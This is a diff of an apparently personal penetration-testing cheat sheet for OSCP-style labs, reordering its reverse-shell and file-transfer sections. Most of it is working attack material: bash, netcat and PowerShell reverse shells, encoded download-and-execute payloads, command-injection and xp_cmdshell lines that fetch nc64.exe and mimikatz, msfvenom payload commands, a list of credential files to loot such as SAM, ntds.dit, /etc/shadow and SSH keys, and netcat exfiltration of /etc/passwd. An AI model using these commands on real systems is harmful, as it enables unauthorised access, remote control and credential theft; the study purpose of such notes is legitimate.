@@ -1,9 +1,9 @@
 - [Capture the flag](#capture-the-flag)
 - [Penetration testing methodology](#penetration-testing-methodology)
-- [Web application attack](#web-application-attack)
-- [Encode-Decode-Hash](#encode-decode-hash)
 - [Reverse shell](#reverse-shell)
+- [Encode-Decode-Hash](#encode-decode-hash)
 - [Files transfer](#files-transfer)
+- [Web application attack](#web-application-attack)
 - [Public exploit](#Public-exploit)
 - [Remote to other machines](#remote-to-other-machines)
 - [Ports scan](#ports-scan)
@@ -140,6 +140,76 @@
      - Monitor for suspicious activity and audit logs
      - Network segmentation and firewall rules
 
+# ❗Reverse shell  
+- [Reverse Shell Generator](https://www.revshells.com/)
+  - Linux `echo $0`  
+    - /bin/sh  
+    - ❗Interactive bash: `bash -i >& /dev/tcp/<kali>/4444 0>&1`
+    - Restricted sh: `bash -c "bash -i >& /dev/tcp/192.168.45.160/4444 0>&1"`
+    - Netcat: `nc -nv <KALI_IP> 6666 -e /bin/bash`  
+  - Windows `echo %COMSPEC%`  
+    - cmd.exe  
+    - ❗ Windows with PowerShell:
+      `powercat -c <KALI_IP> -p 4444 -e powershell`
+      ```
+      #Kali
+      cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+      python3 -m http.server 80
+
+      #Target OS command injection
+      curl -X POST --data 'Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.170/powercat.ps1");powercat -c <kali> -p 4444 -e powershell' http://<target>:8000/archive  
+      ```
+    - No PowerShell/PowerCat: `C:\Windows\Temp\nc64.exe <KALI_IP> 4444 -e C:\Windows\System32\cmd.exe`
+  - Bypassing web applications (Command injection)
+    1. create shell.ps1 on kali
+       ```
+       $client = New-Object System.Net.Sockets.TCPClient("<kali>",4444)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        while($true){
+          $command = $reader.ReadLine()
+          if($command -eq "exit"){break}
+          $output = (Invoke-Expression $command 2>&1 | Out-String)
+          $writer.WriteLine($output)
+          $writer.Flush()
+        }
+        $client.Close()
+       ```
+    3. Start listener `nc -lvnp 4444`
+    4. Execute the encoded payload on target
+       - ?page
+         `powershell -EncodedCommand <Base64EncodedString>`
+       - RCE
+          ```
+          $payload = "powershell -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://<kali>/shell.ps1')"""
+          $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+          powershell -EncodedCommand $encoded
+          ```
+     5. Get reverse shell successfully   
+- PHP injection/ ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
+  - aspx: cmdasp.aspx
+  - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
+  - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+- File upload allowed  
+  **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
+  **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
+  **step 3 generate payload based on target platform**  
+  - windows32: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
+  - windows64: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
+  - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
+  - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
+  - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
+  - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`
+- check if the port is open (FW might block)  
+  `nmap -p 80,443, 8443, 8080, 4444 <TARGET_IP>`  
+- Kali listener
+  `nc -lvnp 443`
+    
+**Tips:**  
+  - Always match LPORT between payload and nc  
+  - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
+  - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls
 # Encode-Decode-Hash    
 - Base64 for web: [CyberChef](https://gchq.github.io/CyberChef/)  
 - Hash identify: [Hash analyzer](https://www.tunnelsup.com/hash-analyzer/)  
@@ -168,7 +238,119 @@
   - DB
     - KeePass -m 13400 ($keepass$*1) `$keepass$*1*50000*0*375756b9e6c72891a8e5645a3338b8c`  
     - Atlassian (PBKDF2-HMAC-SHA1) -m 12001 `{PKCS5S2}NzIyNzM0NzY3NTIwNjI3MdDDis7wPxSbSzfFqDGf7u/L00kSEnupbz36XCL0m7wa`  
-  
+
+# Files transfer 
+[PEN-200 Transferring file from Windows machine to local Kali VM](https://discordapp.com/channels/780824470113615893/1148907181480104028/1148907181480104028)
+ 
+- **Window**
+  - **C:\Windows\System32\config\SAM**
+  - **C:\Windows\System32\config\SYSTEM**
+  - C:\Windows\System32\config\SECURITY
+  - C:\Windows\NTDS\ntds.dit
+  - **Mimikatz dump files `sekurlsa::logonpasswords` `lsadump::sam`  **
+  - LSASS memory dump `lsass.dmp`
+  - plaintext creds: C:\Windows\Panther\Unattend.xml, C:\Windows\sysprep\sysprep.inf
+  - task scheduler XML files: C:\Windows\System32\Tasks\
+  - **User data: C:\Users\<user>\Desktop, C:\Users\<user>\Documents**
+  - **Flag: local.txt, proof.txt**
+
+- **Linux**
+  - **SSH keys**
+    - ~/.ssh/id_rsa → private key
+    - ~/.ssh/id_dsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ed25519
+    - ~/.ssh/authorized_keys  
+  - **Password and shadow files**
+    - /etc/passwd → user accounts
+    - /etc/shadow → hashed passwords (requires root)
+  - **User Data**
+    - /home/<user>/Desktop/*
+    - /home/<user>/Documents/*
+    - local.txt, proof.txt
+  - **Sensitive files for privilege escalation**
+    - SUID/SGID binaries you plan to analyze `find / -perm -4000 -type f 2>/dev/null`
+    - Scripts with plaintext passwords in /usr/local/bin, /opt/, or /home/*
+  - Configs
+    - /etc/apache2/sites-available/
+    - /etc/nginx/sites-available/
+    - /etc/apache2/sites-available/
+    - /etc/cron*/*
+    - crontab -l for each user
+  - Application credential files
+    - /var/www/html/config.php (web apps)
+    - wp-config.php (WordPress)
+  - Logs & Audit
+    - /var/log/auth.log → login attempts, sudo usage
+    - /var/log/secure → login/authentication info
+    - /var/log/syslog → system log
+- Windows from/to Kali
+  - **RDP mounting shared folder**  
+    `xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:<IP_ADD> /cert:ignore /drive:share,/home/kali/share`  
+    `rdesktop -u <USERNAME> -p <PASSWORD> -d corp.com -r disk:share=/home/kali/share <IP_ADD>`
+- **Transfer exploits to windows**
+   - `iwr http://<Kali-IP>/file.exe -OutFile file.exe`  
+   - `certutil -urlcache -f http://<Kali-IP>/file.exe file.exe`
+   - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`  
+   -  `EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://10.10.201.147:1235/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'`
+   -  Target execute the payload over internet
+      ```
+      download the package from https://github.com/gentilkiwi/mimikatz/releases
+      unzip to /home/kali/offsec/tools/minikatz
+      cd to /home/kali/offsec/tools/minikatz/x64
+      python3 -m http.server 80
+
+      target open the http://<KALI>
+      ```
+- Windows to Kali 
+  - Internet access
+    - WsgiDAV
+      ```
+      sudo apt install pipx -y
+      pipx ensurepath
+      pipx install wsgidav
+      mkdir ~/share
+
+      wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share
+      Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
+      ```
+   - No internet access
+     ```
+     #SMB
+     kali: impacket-smbserver share /tmp/smb
+     target: copy C:\path\to\file.txt \\<Kali-IP>\share\
+
+     smbclient -L \\\\192.168.171.10
+     smbclient \\\\192.168.171.10\\<SHARE FOLDER NAME> -N #anonymous access
+     smb: \> ls
+     smb: \offsec\Downloads\> get flag.txt
+     
+     #Netcat
+     kali: nc -lvnp 4444 > loot.txt
+     target: type C:\path\to\loot.txt | nc.exe <Kali-IP> 4444
+      
+     #Base64 encode
+     windows: certutil -encode C:\loot\file.txt file.b6
+     kali: base64 -d file.b64 > file.txt
+     ```
+- Linux to Kali
+  - Internet acces
+    - Net cat
+      ```
+      # On Kali (receiver)
+      nc -lvnp 4444 > file.txt
+      # On target (sender)
+      nc <kali_ip> 4444 < file.txt
+      ```
+  - No internet access
+    - Netcat reverse file transfer
+      ```
+      # On Kali (listener to receive file)
+      nc -lvnp 9001 > loot.tar.gz
+      # On target (send file)
+      tar czf - /etc/passwd | nc <kali_ip> 9001
+      ```
+    - SCP
+      `scp file.txt kali@<kali_ip>:/home/kali/`
+      
 # Web application attack  
 - **Cross-site scripting**
   - ⚠️ **Goal: steal cookies, CSRF admin request**  
@@ -378,189 +560,6 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
      `'; EXEC xp_cmdshell "certutil -urlcache -f http://<kali>/nc64.exe C:/Windows/Temp/nc64.exe";--`  
   9. Trigger Reverse Shell  
       `'; EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe 192.168.45.165 4444 -e C:\Windows\System32\cmd.exe";--`  
-    
-# ❗Reverse shell  
-- [Reverse Shell Generator](https://www.revshells.com/)
-  - Linux `echo $0`  
-    - /bin/sh  
-    - ❗Interactive bash: `bash -i >& /dev/tcp/<kali>/4444 0>&1`
-    - Restricted sh: `bash -c "bash -i >& /dev/tcp/192.168.45.160/4444 0>&1"`
-    - Netcat: `nc -nv <KALI_IP> 6666 -e /bin/bash`  
-  - Windows `echo %COMSPEC%`  
-    - cmd.exe  
-    - ❗ Windows with PowerShell:
-      `powercat -c <KALI_IP> -p 4444 -e powershell`
-      ```
-      #Kali
-      cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
-      python3 -m http.server 80
-
-      #Target OS command injection
-      curl -X POST --data 'Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.170/powercat.ps1");powercat -c <kali> -p 4444 -e powershell' http://<target>:8000/archive  
-      ```
-    - No PowerShell/PowerCat: `C:\Windows\Temp\nc64.exe <KALI_IP> 4444 -e C:\Windows\System32\cmd.exe`
-  - Bypassing web applications (Command injection)
-    1. create shell.ps1 on kali
-       ```
-       $client = New-Object System.Net.Sockets.TCPClient("<kali>",4444)
-        $stream = $client.GetStream()
-        $writer = New-Object System.IO.StreamWriter($stream)
-        $reader = New-Object System.IO.StreamReader($stream)
-        while($true){
-          $command = $reader.ReadLine()
-          if($command -eq "exit"){break}
-          $output = (Invoke-Expression $command 2>&1 | Out-String)
-          $writer.WriteLine($output)
-          $writer.Flush()
-        }
-        $client.Close()
-       ```
-    3. Start listener `nc -lvnp 4444`
-    4. Execute the encoded payload on target
-       - ?page
-         `powershell -EncodedCommand <Base64EncodedString>`
-       - RCE
-          ```
-          $payload = "powershell -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://<kali>/shell.ps1')"""
-          $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
-          powershell -EncodedCommand $encoded
-          ```
-     5. Get reverse shell successfully   
-- PHP injection/ ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
-  - aspx: cmdasp.aspx
-  - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
-  - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
-- File upload allowed  
-  **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
-  **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
-  **step 3 generate payload based on target platform**  
-  - windows32: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
-  - windows64: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
-  - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
-  - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
-  - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
-  - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`
-- check if the port is open (FW might block)  
-  `nmap -p 80,443, 8443, 8080, 4444 <TARGET_IP>`  
-- Kali listener
-  `nc -lvnp 443`
-    
-**Tips:**  
-  - Always match LPORT between payload and nc  
-  - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
-  - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls
-
-# Files transfer 
-[PEN-200 Transferring file from Windows machine to local Kali VM](https://discordapp.com/channels/780824470113615893/1148907181480104028/1148907181480104028)
- 
-- **Window**
-  - **C:\Windows\System32\config\SAM**
-  - **C:\Windows\System32\config\SYSTEM**
-  - C:\Windows\System32\config\SECURITY
-  - C:\Windows\NTDS\ntds.dit
-  - **Mimikatz dump files `sekurlsa::logonpasswords` `lsadump::sam`  **
-  - LSASS memory dump `lsass.dmp`
-  - plaintext creds: C:\Windows\Panther\Unattend.xml, C:\Windows\sysprep\sysprep.inf
-  - task scheduler XML files: C:\Windows\System32\Tasks\
-  - **User data: C:\Users\<user>\Desktop, C:\Users\<user>\Documents**
-  - **Flag: local.txt, proof.txt**
-
-- **Linux**
-  - **SSH keys**
-    - ~/.ssh/id_rsa → private key
-    - ~/.ssh/id_dsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ed25519
-    - ~/.ssh/authorized_keys  
-  - **Password and shadow files**
-    - /etc/passwd → user accounts
-    - /etc/shadow → hashed passwords (requires root)
-  - **User Data**
-    - /home/<user>/Desktop/*
-    - /home/<user>/Documents/*
-    - local.txt, proof.txt
-  - **Sensitive files for privilege escalation**
-    - SUID/SGID binaries you plan to analyze `find / -perm -4000 -type f 2>/dev/null`
-    - Scripts with plaintext passwords in /usr/local/bin, /opt/, or /home/*
-  - Configs
-    - /etc/apache2/sites-available/
-    - /etc/nginx/sites-available/
-    - /etc/apache2/sites-available/
-    - /etc/cron*/*
-    - crontab -l for each user
-  - Application credential files
-    - /var/www/html/config.php (web apps)
-    - wp-config.php (WordPress)
-  - Logs & Audit
-    - /var/log/auth.log → login attempts, sudo usage
-    - /var/log/secure → login/authentication info
-    - /var/log/syslog → system log
-- Windows from/to Kali
-  - **RDP mounting shared folder**  
-    `xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:<IP_ADD> /cert:ignore /drive:share,/home/kali/share`  
-    `rdesktop -u <USERNAME> -p <PASSWORD> -d corp.com -r disk:share=/home/kali/share <IP_ADD>`
-- **Transfer exploits to windows**
-   - `iwr http://<Kali-IP>/file.exe -OutFile file.exe`  
-   - `certutil -urlcache -f http://<Kali-IP>/file.exe file.exe`
-   - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`  
-   -  `EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://10.10.201.147:1235/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'`
-   -  Target execute the payload over internet
-      ```
-      download the package from https://github.com/gentilkiwi/mimikatz/releases
-      unzip to /home/kali/offsec/tools/minikatz
-      cd to /home/kali/offsec/tools/minikatz/x64
-      python3 -m http.server 80
-
-      target open the http://<KALI>
-      ```
-- Windows to Kali 
-  - Internet access
-    - WsgiDAV
-      ```
-      sudo apt install pipx -y
-      pipx ensurepath
-      pipx install wsgidav
-      mkdir ~/share
-
-      wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share
-      Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
-      ```
-   - No internet access
-     ```
-     #SMB
-     kali: impacket-smbserver share /tmp/smb
-     target: copy C:\path\to\file.txt \\<Kali-IP>\share\
-
-     smbclient -L \\\\192.168.171.10
-     smbclient \\\\192.168.171.10\\<SHARE FOLDER NAME> -N #anonymous access
-     smb: \> ls
-     smb: \offsec\Downloads\> get flag.txt
-     
-     #Netcat
-     kali: nc -lvnp 4444 > loot.txt
-     target: type C:\path\to\loot.txt | nc.exe <Kali-IP> 4444
-      
-     #Base64 encode
-     windows: certutil -encode C:\loot\file.txt file.b6
-     kali: base64 -d file.b64 > file.txt
-     ```
-- Linux to Kali
-  - Internet acces
-    - Net cat
-      ```
-      # On Kali (receiver)
-      nc -lvnp 4444 > file.txt
-      # On target (sender)
-      nc <kali_ip> 4444 < file.txt
-      ```
-  - No internet access
-    - Netcat reverse file transfer
-      ```
-      # On Kali (listener to receive file)
-      nc -lvnp 9001 > loot.tar.gz
-      # On target (send file)
-      tar czf - /etc/passwd | nc <kali_ip> 9001
-      ```
-    - SCP
-      `scp file.txt kali@<kali_ip>:/home/kali/`
 
 # Public exploit  
 - Search exploit by service + version  
